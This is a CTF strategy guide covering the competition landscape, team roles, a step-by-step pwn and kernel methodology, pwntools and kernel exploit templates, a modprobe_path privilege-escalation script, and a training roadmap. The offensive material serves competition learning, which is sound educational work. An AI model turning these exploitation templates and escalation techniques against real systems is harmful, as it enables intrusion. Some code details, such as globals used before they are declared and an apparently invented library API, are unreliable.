# CTF Strategy, Methodology & Competition Mastery

> *"The difference between a good CTF player and a world champion isn't talent — it's system."*

This document is the playbook. It covers the competition landscape, systematic methodologies for pwn and kernel challenges, speed optimization, mental game, and a training regiment designed to take you from beginner to world-class.

---

## 1. CTF Competition Landscape

### 1.1 Major Competitions

| CTF | Format | Difficulty | Notes |
|-----|--------|------------|-------|
| **DEF CON CTF** | Attack-Defense | Elite | The world finals. Quals are Jeopardy, finals are A/D. Most prestigious. |
| **PlaidCTF** | Jeopardy | Hard-Elite | Plaid Party of Perfection (PPP) runs this. Insane pwn/re challenges. |
| **HITCON CTF** | Jeopardy | Hard | Taiwan-based. Known for creative kernel and pwn challenges. |
| **hxp CTF** | Jeopardy | Hard-Elite | German CTF. Consistently brutal crypto and pwn. |
| **Balsn CTF** | Jeopardy | Hard | Taiwan-based. Excellent pwn and web. |
| **Codegate CTF** | Jeopardy | Medium-Hard | Korean CTF. Good mix of categories. |
| **DCTF** | Jeopardy | Medium-Hard | Romanian. Solid pwn challenges. |
| **0CTF/TCTF** | Jeopardy | Elite | Chinese CTF. Extremely hard pwn and kernel. |
| **SECCON CTF** | Jeopardy | Hard | Japanese. Quality exploitation challenges. |
| **BSL CTF** | Jeopardy | Medium | Good for intermediate players. |
| **Pwn2Own** | Live exploitation | Elite | Not a traditional CTF, but the ultimate exploitation contest. Target-specific, zero-day focused. |

### 1.2 CTF Formats

**Jeopardy** — Solve challenges across categories (pwn, web, crypto, rev, misc, forensics). Each challenge yields a flag. Most common format.

**Attack-Defense (A/D)** — Each team gets identical servers running vulnerable services. You must patch your own services while exploiting opponents'. Requires simultaneous offense and defense.

**Mixed** — Jeopardy + A/D components. Example: DEF CON Quals often mixes both.

**King of the Hill (KOTH)** — Maintain control of a target. Points accrue over time for holding a position. Strategic depth beyond just "get shell."

### 1.3 Team Composition (Elite Teams)

A world-class team of 4-6 typically distributes like this:

| Role | Count | Focus |
|------|-------|-------|
| **Pwner** | 1-2 | Binary exploitation, kernel pwn, ROP, heap |
| **Web Specialist** | 1 | Web exploits, SSRF, deserialization, prototype pollution |
| **Crypto Specialist** | 1 | Mathematical attacks, side channels, protocol flaws |
| **Reverse Engineer** | 1 | Binary analysis, obfuscation, custom VM reversing |
| **Forensics/Misc** | 1 | Network analysis, steganography, OSINT, scripting |

In smaller teams, everyone does everything. In elite teams, specialization wins because depth beats breadth at the highest difficulty levels.

**Key principle**: During a CTF, have a shared tracker (Google Sheet, Notion, etc.) with columns for challenge name, category, points, assignee, status, and notes. This prevents duplicate work and enables handoffs.

### 1.4 CTFtime Rating System

CTFtime uses an ELO-like rating system. Key facts:
- Points are weighted by the number of teams that participated
- Your top **N** results count (N varies but is typically around the top 8-10)
- Higher-weighted events (DEF CON, PlaidCTF, hxp) give more points
- "Weight" of an event depends on participant count and overall strength of field

Strategy implication: attending and placing well in **major** CTFs matters more than winning small ones. However, small CTFs are excellent practice and can fill gaps in your ranking.

---

## 2. Pwn Challenge Methodology — The Systematic Approach

This is the core methodology. Follow it every time. Speed comes from following the system automatically, not from skipping steps.

### STEP 1: Reconnaissance

Before you touch Ghidra or GDB, gather all metadata about the binary.

```bash
# File type and architecture
file ./target

# All protections at once
checksec --file=./target

# If checksec not available, manual checks:
readelf -h ./target          # ELF header (class, arch, entry point)
readelf -l ./target          # Program headers (NX, RELRO)
readelf -S ./target          # Section headers
readelf -d ./target          # Dynamic section (libraries, BIND_NOW)
readelf -r ./target          # Relocation entries

# Linked libraries
ldd ./target

# Strings for quick wins
strings ./target | grep -iE 'flag|shell|/bin|system|cat '

# Symbol table (if not stripped)
nm ./target 2>/dev/null | head -50
readelf -s ./target | head -50

# Check for SECCOMP
seccomp-tools dump ./target 2>/dev/null
```

**Recon checklist** — note all of these immediately:
- [ ] Architecture (x86, x64, ARM, MIPS, AARCH64?)
- [ ] Bit width (32 or 64?)
- [ ] Static or dynamically linked?
- [ ] Stripped or has symbols?
- [ ] NX (No-Execute stack)?
- [ ] PIE (Position-Independent Executable)?
- [ ] Canary (Stack buffer overflow protection)?
- [ ] RELRO (Partial or Full)?
- [ ] ASLR (system-level, check `/proc/sys/kernel/randomize_va_space`)
- [ ] Seccomp filter?
- [ ] Forking server (handles multiple connections)?

The answers to these questions determine your exploit strategy.

### STEP 2: Static Analysis

Open in Ghidra. Always.

1. **Import the binary** into Ghidra, let auto-analysis run.
2. **Find `main()`** (or `_start` if stripped). If stripped, look at `entry` → find `__libc_csu_init` pattern to locate `main`.
3. **Rename and retype variables** as you understand them. This investment pays off exponentially.
4. **Identify key functions**: `read()`, `gets()`, `scanf()`, `memcpy()`, `malloc()`, `free()`, `printf()` — any function that handles user input.
5. **Trace input flow**: Where does user input come from? Where does it go? What buffers does it touch?
6. **Look for custom structures**: Programs with complex structs often have heap vulnerabilities.
7. **Check for hidden functions**: Sometimes the challenge has a `win()` or `shell()` function that you just need to redirect execution to.

If the binary has C++ or Rust, brace for complexity. Look for vtables, destructors, and custom allocators.

**Ghidra tips for speed:**
- Assign keyboard shortcuts: `L` for rename label, `T` for retype, `;` for comment
- Use the Decompile window side-by-side with the Listing (assembly)
- After renaming things, the decompiler output becomes much more readable

### STEP 3: Dynamic Analysis

Run the binary. Observe behavior. Never skip this.

```bash
# Basic execution
echo "AAAA" | ./target
echo "%x.%x.%x.%x" | ./target     # format string test

# With input file
./target < input.txt

# Network target
nc 10.10.10.10 1337

# Attach to running process
gdb -p $(pidof target)
```

**GDB with pwndbg/GEF** (use pwndbg — it's the best):

```gdb
# Essential pwndbg commands
checksec                        # Verify protections
vmmap                           # Memory map
pwndbg> context                 # Assembly + registers + stack
pwndbg> telescope $sp 20       # Stack view
pwndbg> hexdump $rsp 64         # Hex dump at stack
pwndbg> distance addr1 addr2    # Calculate offsets

# Break on common functions
b *main
b *read
b *malloc
b *free
b *printf

# Run with input
run <<< $(python -c "print('A'*100)")

# Examine memory
x/40gx $rsp
x/s <address>

# Watchpoints for heap
watch *(long*)(<address>)
```

**Behavior questions to answer:**
- Does it loop? How many times can you interact?
- What happens with long input? Crash? Truncation?
- What happens with format string specifiers (`%x`, `%p`, `%s`, `%n`)?
- Does it print anything back? (Information leak path)
- Timer? Alarm? Anti-debug?

### STEP 4: Vulnerability Identification

Systematically check for these vulnerability classes based on what you found:

**Buffer Overflow** (most common in intro CTF):
- Input larger than buffer? What's the offset to saved RIP?
- Use `cyclic` pattern: `cyclic 200` → `cyclic -l 0x61616168`

**Format String**:
- `%x` leak? `%n` write? What offset?
- Direct parameter access: `%7$x`, `%7$n`

**Heap Exploitation**:
- Use after free (UAF)? Double free? Heap overflow?
- What allocator? glibc version matters immensely.
- Check: `tcache`, `fastbin`, `unsorted bin` — attack techniques vary by version.

**Integer Overflow/Underflow**:
- Signed/unsigned confusion? Size check bypass via wraparound?
- Off-by-one in loops?

**Logic Bugs**:
- Conditional checks that can be bypassed?
- Race conditions (TOCTOU)?
- Type confusion?

**Input tracing template:**
```
Source of input → Buffer → Bounds check? → Destination → What is adjacent?
```

Draw this on paper or a whiteboard. Visualizing data flow is the fastest path to finding bugs.

### STEP 5: Exploit Strategy

You have a vulnerability. Now answer two questions:

1. **What primitive do you have?** (e.g., "arbitrary write at a known offset", "stack overflow of 40 bytes past RIP", "format string with write")
2. **What do you need?** (e.g., "shell", "arbitrary code execution", "read `/flag`", "escalate privileges")

Then map the path:

```
Primitive → Intermediate goal → Intermediate goal → Goal
```

**Common exploit paths:**

| Primitive | Path | Target |
|-----------|------|--------|
| Stack overflow, no PIE, no canary | Overwrite RIP → `ret2win` | Address of `win()` function |
| Stack overflow, NX | Overwrite RIP → `ROP chain` | `pop rdi; ret` + `"/bin/sh"` + `system()` |
| Stack overflow, PIE | Leak PIE base → ROP | Need info leak first |
| Format string | Arbitrary write → overwrite GOT/return addr | `printf("%<n>c%n")` |
| Heap overflow (glibc 2.27-2.31) | `tcache poisoning` → arbitrary write | Free poisoned chunk, malloc at target |
| Heap UAF | `tcache dup` → arbitrary write | Free without clearing pointer, malloc again |
| GOT overwrite (partial RELRO) | Overwrite `GOT[eXit]` with `system` | Call `exit("/bin/sh")` or similar |

**Key decision tree:**

```
Is there a win function?
├─ Yes → Redirect execution to it (stack overflow? format string? GOT overwrite?)
└─ No → Need shell
    ├─ NX disabled? → Shellcode on stack
    ├─ NX enabled, libc given? → ret2libc
    ├─ NX enabled, no libc? → Leak libc → ret2libc
    └─ Seccomp? → ORW (open/read/write) shellcode
```

### STEP 6: Exploit Development

Write the exploit in pwntools. Always.

**Full exploit template** (ready to use):

```python
#!/usr/bin/env python3
from pwn import *

# Context setup — CHANGE THESE
context.binary = ELF('./target', checksec=False)
context.log_level = 'debug'  # Set to 'info' when exploit works

# Connection
HOST = '10.10.10.10'
PORT = 1337

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug('./target', '''
            b *main+0x50
            c
        ''')
    else:
        return process('./target')

# Helper functions
def sla(delim, data):
    return io.sendlineafter(delim, data)

def sa(delim, data):
    return io.sendafter(delim, data)

# Offsets and addresses — fill in during analysis
# offset = XXX
# win_addr = XXX

def exploit():
    global io
    io = conn()

    # ===== YOUR EXPLOIT HERE =====

    # Example: stack overflow to ret2win
    # payload = b'A' * offset
    # payload += p64(win_addr)
    # io.sendline(payload)

    # ==============================

    io.interactive()

if __name__ == '__main__':
    exploit()
```

**Common pwntools patterns:**

```python
# Leak and calculate
io.recvuntil(b'Output: ')
leak = int(io.recvline().strip(), 16)
base = leak - offset_from_base
log.info(f"Leak: {hex(leak)}, Base: {hex(base)}")

# ROP chain construction
rop = ROP(context.binary)
rop.call('puts', [context.binary.got.puts])
rop.call('main')
payload = b'A' * offset + rop.chain()

# ret2libc (after libc leak)
libc = ELF('./libc.so.6')
libc.address = leaked_puts - libc.symbols.puts
system = libc.symbols.system
binsh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.call('system', [binsh])

# One gadget (when available)
from one_gadget import generate_one_gadget
gadgets = generate_one_gadget('./libc.so.6')
# Try each gadget with constraints

# Format string exploit
def fmt_write(target_addr, value, offset):
    payload = f"%{value}c%{offset}$n".encode()
    payload = payload.ljust(8, b'\x00')
    payload += p64(target_addr)
    return payload

# Struct-like packing for heap
def p8(x):  return struct.pack('<B', x)
def p16(x): return struct.pack('<H', x)
def p32(x): return struct.pack('<I', x)
def p64(x): return struct.pack('<Q', x)
```

### STEP 7: Debug & Stabilize

Exploits that work locally often fail remotely. Here's why and how to fix:

**Common failure modes and fixes:**

| Problem | Cause | Fix |
|---------|-------|-----|
| Exploit works locally, not remotely | Different libc version | Get remote libc via leak; use `pwn libc` to identify version |
| Crash on remote but not local | Stack alignment (`movaps`) | Add `ret` gadget before `system()` call |
| Heap exploit unstable | Heap state differs | Align chunks; use `malloc(0)` or `scanf` to consume items; do full heap feng shui |
| Timing issues | Slow network | Use `sendlineafter()` not `sendline()` + `sleep()` |
| "Broken pipe" on remote | Missing newline or wrong delimiter | Match expected input format exactly |

**Debugging workflow:**

```bash
# Run exploit locally first
python3 exploit.py

# With GDB attached
python3 exploit.py GDB

# Against remote
python3 exploit.py REMOTE

# Dump core on crash for offline analysis
ulimit -c unlimited
```

**Stabilization techniques:**
- Replace `raw_input()` breakpoints with `pause()` in pwntools
- Use `io.clean()` to clear buffers between operations
- For heap exploits, ensure your feng shui creates deterministic layout
- If the binary forks, exploit as many times as needed — each connection is fresh

### STEP 8: Submit the Flag

```bash
# If you get a shell
cat /flag
cat /flag.txt
cat /home/*/flag*
find / -name '*flag*' 2>/dev/null
ls -la /

# If flag is in environment
env | grep -i flag

# If you're not root
id
sudo -l
```

Never assume the flag filename. Always check multiple locations.

---

## 3. Kernel CTF Challenges — Specific Methodology

Kernel exploitation in CTFs is a specialized skill. The setup is almost always the same pattern.

### 3.1 Typical Kernel CTF Setup

You're given:
- A QEMU launch script (`run.sh` or `start.sh`)
- A kernel image (`bzImage` or `vmlinux`)
- A `rootfs.cpio.gz` or `initramfs.cpio.gz` (the root filesystem)
- Optionally a vulnerable kernel module (`.ko` file)
- Optionally a custom `config` file (`.config`)

The goal: escalate privileges from user to root and read `/flag`.

### 3.2 Analyzing the Provided Setup

**Step 1: Examine the QEMU launch script**

```bash
cat run.sh
```

Look for:
- `-append` flags: `root=/dev/ram rw console=ttyS0 oops=panic quiet nokaslr` → **Is KASLR on?**
- `-cpu kvm64,+smep,+smap` → **SMEP/SMAP enabled?**
- `-m 64M` or similar → Memory size (small memory can limit heap feng shui)
- `-smp 1` → Number of CPUs
- `-netdev` / `-device` → Network?
- `-monitor` → Can you access QEMU monitor? (sometimes useful)

**Key flags that matter for exploitation:**
| Flag | Meaning | Impact |
|------|---------|--------|
| `nokaslr` | KASLR disabled | Easy — addresses are fixed |
| `kaslr` or absent | KASLR enabled | Must leak kernel base |
| `+smep` | SMEP enabled | Cannot execute userspace code from kernel mode |
| `+smap` | SMAP enabled | Cannot access userspace memory from kernel mode |
| `nopti` | KPTI disabled | No page table isolation |
| `pti` or absent | KPTI enabled | Must use `swapgs; iretq` or `swapgs_restore_regs_and_return_to_usermode` |

**Step 2: Extract and analyze initramfs**

```bash
mkdir initramfs && cd initramfs
gzip -dc ../rootfs.cpio.gz | cpio -idm

# If it's not gzipped:
# cpio -idm < ../rootfs.cpio

# Examine the contents
ls -la
cat init
```

The `init` script is critical. It tells you:
- What user you run as (usually `ctf` or a low-priv user)
- What modules are loaded (`insmod /path/to/module.ko`)
- File permissions on `/flag`
- Whether `/proc/sys/kernel/randomize_va_space` is set
- SUID binaries if any

**Step 3: Extract the vulnerable kernel module**

```bash
# The .ko file is in the initramfs
file *.ko
checksec --file=*.ko

# Load into Ghidra for analysis
```

**Step 4: Examine kernel config**

```bash
# Extract from the compressed kernel if needed (or provided separately)
grep -i "CONFIG_STATIC_USERMODEHELPER\|CONFIG_HARDENED_USERCOPY\|CONFIG_CFI\|CONFIG_RANDOMIZE_BASE\|CONFIG_STACKPROTECTOR\|CONFIG_SLAB_FREELIST_RANDOMIZE\|CONFIG_SLAB_MERGE_DEFAULT\|CONFIG_INIT_ON_ALLOC_DEFAULT_ON\|CONFIG_INIT_ON_FREE_DEFAULT_ON" .config
```

Hardened configs change your exploitation approach significantly. Key ones:
- `CONFIG_STATIC_USERMODEHELPER=y` → Blocks `modprobe_path` overwrite
- `CONFIG_HARDENED_USERCOPY=y` → Blocks some OOB reads via `usercopy`
- `CONFIG_CFI=y` → Control Flow Integrity, blocks arbitrary function calls
- `CONFIG_INIT_ON_FREE_DEFAULT_ON=y` → Heap memories zeroed on free (kills many UAF)

### 3.3 Analyzing the Vulnerable Kernel Module

Kernel modules in CTFs typically provide a character device (`/dev/vuln`) with `ioctl`, `read`, and `write` handlers, plus sometimes `mmap`.

**Ghidra analysis workflow:**

1. Open the `.ko` in Ghidra.
2. Find `module_init` — this registers the device.
3. Find the file operations struct — maps to your handlers.
4. Analyze each handler (`vuln_ioctl`, `vuln_read`, `vuln_write`, `vuln_mmap`).
5. Look for:
   - `copy_from_user` / `copy_to_user` — data transfer with userspace
   - `kmalloc` / `kfree` — kernel heap operations
   - Any global or per-device state structs
   - Race condition patterns (does it hold locks? use `mutex_lock`?)
   - `printk` calls (useful for debugging, sometimes the vulnerability itself)

**Common kernel CTF vulnerability patterns:**

| Vulnerability | Typical Manifestation |
|---------------|----------------------|
| **UAF** | Module frees a kernel object but keeps a pointer, accessible via ioctl |
| **Heap overflow** | `copy_from_user` writes more than `kmalloc`'d |
| **OOB read/write** | ioctl with index check bypass |
| **Type confusion** | ioctl commands operate on wrong struct type |
| **Race condition** | Double ioctl without locking, TOCTOU in read/write |
| **Stack overflow** | Seldom in kernel modules, but possible with large `copy_from_user` |
| **Null pointer deref** | Operations on NULL-checked-then-used pointers |
| **Integer overflow** | Size checks that wrap around |

### 3.4 Writing Kernel Exploits

A kernel exploit is a userspace C program that you compile and run inside the QEMU VM.

**Kernel exploit template:**

```c
// kernel_exploit.c — Base template for kernel CTF exploits
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <pthread.h>
#include <errno.h>

// Device paths
#define VULN_DEV "/dev/vuln"

// IOCTL commands — fill in from module analysis
#define CMD_ALLOC   0x1337
#define CMD_DELETE  0x1338
#define CMD_EDIT    0x1339
#define CMD_READ    0x133a

// Structure definitions — match kernel module
struct request {
    unsigned long idx;
    unsigned long size;
    char *buf;
};

// Globals
int fd;

// Helper: open device
void open_dev(void) {
    fd = open(VULN_DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
}

// Helper: spawn process (for double-fork, etc.)
void spawn_shell(void) {
    printf("[*] Spawning root shell...\n");
    system("/bin/sh");
}

// Escalate: commit_creds(prepare_kernel_cred(0))
// These addresses must be determined from the kernel
unsigned long commit_creds_addr;
unsigned long prepare_kernel_cred_addr;

// Escalation via modify_creds
void escalate_creds(void) {
    // Method 1: Direct function call (if you can redirect control flow)
    // asm volatile(
    //     "mov rax, <prepare_kernel_cred_addr>\n"
    //     "xor rdi, rdi\n"
    //     "call rax\n"
    //     "mov rdi, rax\n"
    //     "mov rax, <commit_creds_addr>\n"
    //     "call rax\n"
    // );

    // Method 2: Overwrite modprobe_path
    // Method 3: Overwrite cred struct directly
    // Method 4: msg_msg / pipe_buffer / sk_buff hijacking
}

// Return to userspace safely (KPTI bypass)
void save_state(void) {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "mov %%rsp, %2\n"
        "pushf\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
    );
}

void restore_state_and_shell(void) {
    __asm__ volatile(
        "swapgs\n"
        "iretq\n"
        : : "D"(user_rsp), "S"(user_ss), "d"(user_rflags | 0x200),
            "a"(user_cs), "0"(spawn_shell)
    );
}

unsigned long user_cs, user_ss, user_rsp, user_rflags;

int main(void) {
    save_state();
    open_dev();

    // ===== YOUR EXPLOIT HERE =====

    // If we got here, we should be root
    spawn_shell();
    return 0;
}
```

**Cross-compilation:**

```bash
# Compile for the target (usually x86_64)
gcc -static -o exploit exploit.c

# Or with musl for smaller binaries
musl-gcc -static -o exploit exploit.c -pthread

# Transfer to VM (via initramfs or network)
cp exploit ../initramfs/
cd .. && find initramfs/ | cpio -o -H newc | gzip > rootfs.cpio.gz
```

**Common kernel exploitation techniques by scenario:**

**SMEP bypass** — Use ROP in kernel space, not shellcode in user space:
```c
// Find gadgets in vmlinux
// ROP chain: prepare_kernel_cred(0) -> commit_creds -> swapgs; iretq
```

**SMAP bypass** — Cannot read/write user memory from kernel:
```c
// Copy payload to kernel memory first (via module's copy_from_user)
// Or use copy_from_user in your ROP chain
```

**KASLR bypass** — Leak kernel base:
```c
// Method 1: /proc/kallsyms (if readable)
// Method 2: Leak from kernel objects that contain kernel pointers
// Method 3: Relative overwrite if you have partial write
```

**Common kernel exploit primitives → escalation:**

| Primitive | Escalation Path |
|-----------|-----------------|
| Arbitrary kernel write | Overwrite `modprobe_path` → trigger unknown format script |
| Arbitrary kernel write | Overwrite `cred` struct being used by current task |
| UAF (freed slab object) | Cross-cache attack or same-cache reclaim |
| Double free | `tcache` or `fastbin` poisoning → arbitrary alloc in kernel |
| OOB read | Leak kernel pointers → defeat KASLR |
| Stack overflow in kernel | ROP chain using vmlinux gadgets |

**Modprobe_path overwrite** (the most reliable generic technique):

```bash
# Step 1: Overwrite modprobe_path to point to your script
# Step 2: Execute an unknown binary format
# Step 3: Kernel runs your script as root

echo '#!/bin/sh' > /tmp/x
echo 'chmod 777 /flag' >> /tmp/x  # or cat /flag > /tmp/out
chmod +x /tmp/x

# Trigger unknown format
printf '\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy
```

### 3.5 Getting a Shell as Root

After successful exploitation:

```bash
# Verify
id
# uid=0(root) gid=0(root)

# Get the flag
cat /flag
cat /flag.txt
find / -name '*flag*' -exec cat {} \; 2>/dev/null
```

---

## 4. Speed Optimization for Competitions

Speed wins CTFs. The team that solves faster gets more points and frees up time for harder challenges.

### 4.1 Template Exploit Scripts

**Universal pwntools template** (copy this for every pwn challenge):

```python
#!/usr/bin/env python3
from pwn import *

# ============ CONFIGURATION ============
BINARY = './target'
HOST = ''
PORT = 0
LIBC = ''
# =======================================

def setup(binary=BINARY, libc=LIBC):
    elf = ELF(binary, checksec=True)
    libc = ELF(libc) if libc else None
    context.binary = elf
    context.log_level = 'info'
    return elf, libc

def conn(host=HOST, port=PORT, binary=BINARY):
    if args.REMOTE:
        io = remote(host, port)
    elif args.GDB:
        io = gdb.debug(binary, GDB_SCRIPT)
    else:
        io = process(binary)
    return io

GDB_SCRIPT = '''
b *main
continue
'''

elf, libc = setup()
io = conn()

# ============ EXPLOIT ============

io.interactive()
```

**Heap exploit template:**

```python
#!/usr/bin/env python3
from pwn import *

BINARY = './target'
LIBC = './libc.so.6'

elf = ELF(BINARY)
libc = ELF(LIBC)
context.binary = elf

def conn():
    if args.REMOTE:
        return remote('HOST', PORT)
    elif args.GDB:
        return gdb.debug(BINARY, 'b *main+100\nc')
    return process(BINARY)

io = conn()

# Chunk allocation wrappers
def alloc(size, data=b'AAAA'):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendlineafter(b'data: ', data)

def free(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'idx: ', str(idx).encode())
    return io.recvline()

def edit(idx, data):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'idx: ', str(idx).encode())
    io.sendlineafter(b'data: ', data)

# === YOUR HEAP FENG SHUI HERE ===

io.interactive()
```

### 4.2 Personal Exploit Library

Maintain a `~/ctf-tools/` directory with:

```
ctf-tools/
├── templates/
│   ├── pwn_template.py
│   ├── heap_template.py
│   ├── kernel_exploit.c
│   └── rop_template.py
├── gadgets/
│   ├── ropper                  # ROP gadget finder
│   └── one_gadget              # One-gadget finder
├── scripts/
│   ├── checksec_wrapper.sh     # Batch checksec
│   ├── libc_database.py       # Libc version from leak
│   └── patchelf.sh            # Patch binary with given libc
├── kernel/
│   ├── extract_vmlinux.sh     # Extract vmlinux from bzImage
│   ├── extract_initramfs.sh   # Extract initramfs
│   └── find_gadgets.py        # Find ROP gadgets in vmlinux
└── utils/
    ├── disass.py              # Quick disassembly
    └── crc.py                 # Common CRC/hash functions
```

### 4.3 Automation with pwntools

Key pwntools features that save time:

```python
# Automatic ROP chain construction
rop = ROP(elf)
rop.call('puts', [elf.got.puts])
rop.call('main')
log.info(rop.dump())

# Automatic libc database lookup (via libc_database)
# After leaking puts@GOT:
from libc_database import LibcDatabase
db = LibcDatabase()
libc = db.search({'puts': leaked_puts})
log.info(f"Libc: {libc.name}")

# DynELF — resolve remote libc functions without libc
d = DynELF(leaker, elf=elf)
system = d.lookup('system')

# fmtstr — format string exploit generation
payload = fmtstr.payload(0x804a000, {0x804a000: 0x41414141})

# struct packing helpers
flat([1, 2, 3])  # Pack everything according to context

# Signing and masking
p64(0xdeadbeef)  # Works correctly for both positive and negative values
```

### 4.4 Common One-Liners and Shortcuts

```python
# Quick cyclic pattern for offset finding
cyclic_find(0x61616168)  # Find offset from crash value

# Quick launch with pwntools tubes
process('./target').sendline(b'A'*64 + p64(0xdeadbeef))

# One-gadget for quick escalation
# one_gadget libc.so.6

# ROP gadget search
ropper --file target --search "pop rdi; ret"
ROPgadget --binary target --ropchain

# Pipe python into target
python3 -c "import struct; print('A'*64 + struct.pack('<Q', 0x41414141))" | ./target

# Quick patch (disable alarm, patch exit calls, etc.)
printf '\x90\x90' | dd of=target bs=1 seek=0x1234 count=2 conv=notrunc

# Extract vmlinux from bzImage
./extract-vmlinux bzImage > vmlinux

# Find gadgets in vmlinux
ropper --file vmlinux --search "commit_creds"

# Run QEMU with GDB stub
qemu-system-x86_64 -kernel bzImage -initrd rootfs.cpio.gz -S -s ...

# Connect GDB
target remote localhost:1234
```

### 4.5 Time Management During CTF

- **First 30 minutes**: Read ALL challenges. Categorize by difficulty and your strengths. Make a quick plan.
- **First 2 hours**: Knock out easy challenges. Build momentum. Get points on the board.
- **Middle 6-12 hours**: Focus on medium challenges in your specialty. Hand off challenges you're stuck on.
- **Last 2-4 hours**: Focus on remaining solvable challenges. Sometimes partial solves count (e.g., leaking the flag format).
- **Rule of 30**: If you've spent 30 minutes on a challenge with zero progress, switch to another. Come back with fresh eyes.
- **Sleep**: In 48-hour CTFs, sleeping 4-6 hours massively improves the second day. No exceptions.

---

## 5. Mental Game & Competition Strategy

### 5.1 How to Approach When Stuck

1. **Re-read the challenge description**. There's often a hint hidden in plain text.
2. **Re-check your assumptions**. You probably assumed something wrong. Trace back.
3. **Try a different vulnerability class**. Stuck on heap? Maybe it's actually a format string.
4. **Check for trivial wins**. Are there obvious format string bugs? Integer overflows in size checks?
5. **Compare with known challenge patterns**. Most CTF challenges are variations of known techniques.
6. **Ask a teammate for a second look**. Fresh eyes catch what you've been overlooking.
7. **Step away for 10 minutes**. Seriously. Your brain processes in the background.

### 5.2 Team Communication and Challenge Handoff

**Effective handoff protocol:**

When handing off a challenge, provide:
```
Challenge: "babyheap"
Progress: Found UAF in ioctl cmd 3. Freed chunk is still accessible via cmd 4.
Blocker: Can't get arbitrary write because tcache has safe-linking.
Notes: libc is 2.35, so safe-linking is on. Consider usingHouse of Appleor cross-cache.
Files: /tmp/babyheap_exploit_wip.py
```

**What NOT to do:**
- Don't hand off with just "I couldn't do it." — always explain what you tried.
- Don't spend 6 hours on one challenge silently.
- Don't skip updating the shared tracker.

### 5.3 When to Skip and Come Back

Skip when:
- You've been stuck for 30+ minutes with zero progress
- The challenge requires a technique you're very weak at (e.g., crypto for a pwn player)
- Another challenge in your strength just opened or was updated
- Your brain is fried and you keep making silly mistakes

Come back when:
- You solved an easier challenge and regained confidence
- A teammate solved a related challenge that gave insights
- New challenge hints were released
- You learned a new technique from solving another challenge

### 5.4 Learning from Writeups the RIGHT Way

**The wrong way:** Read the writeup, say "oh that makes sense," move on.

**The right way:**

1. **Solve first, read later.** Spend at least 1-2 hours on a challenge before reading the writeup. You need to hit the wall.
2. **Read the writeup actively.** Don't just read — implement the exploit yourself.
3. **Understand WHY each step is necessary.** Don't just copy the technique. Ask: "What would happen if I skipped this step?"
4. **Add to your personal knowledge base.** Write down the technique, the trigger condition, and a minimal reproducer.
5. **Create a similar challenge.** The ultimate test: can you make a challenge that uses this technique?
6. **Re-solve without reference.** Come back in a week and solve it from scratch.

### 5.5 Building a Personal Knowledge Base

Organize by technique, not by challenge:

```
knowledge-base/
├── heap/
│   ├── tcache_poisoning.md
│   ├── house_of_force.md
│   ├── house_of_orange.md
│   ├── house_of_apple.md
│   ├── fastbin_dup.md
│   ├── largebin_attack.md
│   └── unsorted_bin_attack.md
├── stack/
│   ├── basic_overflow.md
│   ├── ret2libc.md
│   ├── ret2csu.md
│   ├── srop.md
│   └── stack_pivot.md
├── format_string/
│   ├── read_primitive.md
│   ├── write_primitive.md
│   └── pwntools_fmtstr.md
├── kernel/
│   ├── modprobe_path_overwrite.md
│   ├── cred_overwrite.md
│   ├── kernel_rop.md
│   └── smep_smap_bypass.md
├── misc/
│   ├── race_conditions.md
│   ├── seccomp_bypass.md
│   └── integer_overflows.md
└── tools/
    ├── pwntools_cheatsheet.md
    ├── gdb_cheatsheet.md
    └── ropper_cheatsheet.md
```

Each entry should contain:
- **Technique description** (what it does)
- **Prerequisites** (when does it apply?)
- **Trigger conditions** (what vulnerability do you need?)
- **Step-by-step exploit construction**
- **Minimal proof-of-concept code**
- **CTF examples** (which challenges used this?)
- **Glibc version constraints**

---

## 6. Practice & Training Regiment

### 6.1 Difficulty Progression Roadmap

**Level 1: Beginner (0-6 months)**

Focus: Understanding basic exploitation primitives.

- Learn C, assembly (x86/x64), and how the stack works
- Learn basic Linux tools (file, strings, strace, ltrace)
- Learn pwntools basics
- Master: simple stack overflows, ret2win, basic ret2libc
- Practice on: picoCTF, OverTheWire (Narnia, Behemoth), pwnable.kr (toddlr, input)

**Level 2: Intermediate (6-18 months)**

Focus: Heap exploitation, format strings, ROP mastery.

- Deep dive into glibc heap internals (ptmalloc2)
- Master: fastbin attacks, unsorted bin leaks, tcache poisoning
- Master: format string (arbitrary read/write)
- Master: ROP chain construction
- Practice on: pwnable.tw (all challenges), pwnable.kr (bos, asm), Root-Me (pwn section)

**Level 3: Advanced (18-36 months)**

Focus: Complex heap, kernel exploitation, defense evasion.

- Master: House of Orange, House of Force, House of Apple, large bin attacks
- Learn: kernel exploitation basics (UAF in kernel modules, ROP in kernel space)
- Learn: seccomp filter analysis and ORW shellcode
- Learn: glibc 2.32+ safe-linking bypass
- Practice on: DEF CON Quals past challenges, HITCON past challenges, hxp past challenges

**Level 4: World-Class (36+ months)**

Focus: Novel techniques, speed, and breadth.

- Contribute to exploitation tooling (pwntools, pwndbg, one_gadget)
- Create your own challenges
- Compete in every major CTF
- Study latest research papers and blog posts
- Master: kernel exploitation at the level of real CVEs
- Practice on: 0CTF/TCTF,DEF CON finals, hxp, real-world CVE POCs

### 6.2 Best Practice Platforms

| Platform | Difficulty | Best For |
|----------|------------|----------|
| **picoCTF** | Beginner | First steps, basics |
| **pwnable.kr** | Beginner-Intermediate | Classic challenges, good progression |
| **pwnable.tw** | Intermediate-Advanced | Excellent pwn challenges with scoreboard |
| **OverTheWire** | Beginner | Wargames for absolute beginners |
| **Root-Me** | Beginner-Intermediate | Wide variety, French community |
